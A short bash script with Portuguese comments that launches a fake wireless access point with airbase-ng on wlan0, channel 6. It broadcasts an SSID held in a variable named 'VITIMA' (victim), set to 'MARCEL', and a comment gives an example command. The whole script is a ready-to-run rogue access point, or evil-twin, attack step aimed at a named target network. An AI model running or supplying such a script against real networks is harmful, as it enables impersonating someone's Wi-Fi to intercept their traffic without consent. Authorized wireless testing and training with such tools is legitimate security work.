#!/bin/bash

# Interface wireless utilizada
INTERFACE=wlan0
VITIMA="MARCEL"
CHANNEL=6


#start fake ap
airbase-ng -e "$VITIMA" -c "$CHANNEL" "$INTERFACE"
#ex: airbase-ng -e fake-ap -c 6 mon0
